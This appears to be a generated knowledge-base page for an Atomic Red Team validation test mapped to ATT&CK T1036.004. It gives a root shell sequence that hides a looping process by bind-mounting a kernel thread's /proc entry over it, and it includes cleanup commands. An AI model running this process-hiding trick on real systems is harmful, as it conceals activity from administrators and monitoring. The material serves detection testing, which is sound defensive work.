---
atomic_guid: "ad4b73c2-d6e2-4d8b-9868-4c6f55906e01"
title: "Hiding a malicious process with bind mounts"
framework: "atomic"
generated: "true"
attack_technique_id: "T1036.004"
attack_technique_name: "Masquerading: Masquerade Task or Service"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.004/T1036.004.yaml"
build_date: "2026-04-27 19:12:25"
executor: "sh"
aliases:
  - "ad4b73c2-d6e2-4d8b-9868-4c6f55906e01"
  - "Hiding a malicious process with bind mounts"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Creates a malicious process and hides it by bind mounting to the /proc filesystem of a benign process

## ATT&CK Mapping

- [[kb/attack/techniques/T1036-masquerading#^t1036004-masquerade-task-or-service|T1036.004: Masquerade Task or Service]]

## Executor

- elevation_required: True
- name: sh

### Command

```bash
eval '(while true; do :; done) &'
echo $! > /tmp/evil_pid.txt
random_kernel_pid=$(ps -ef | grep "\[.*\]" | awk '{print $2}' | shuf -n 1)
sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)
```

### Cleanup

```bash
kill $(cat /tmp/evil_pid.txt) || echo "Failed to kill PID $evil_pid"
rm /tmp/evil_pid.txt
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.004/T1036.004.yaml)
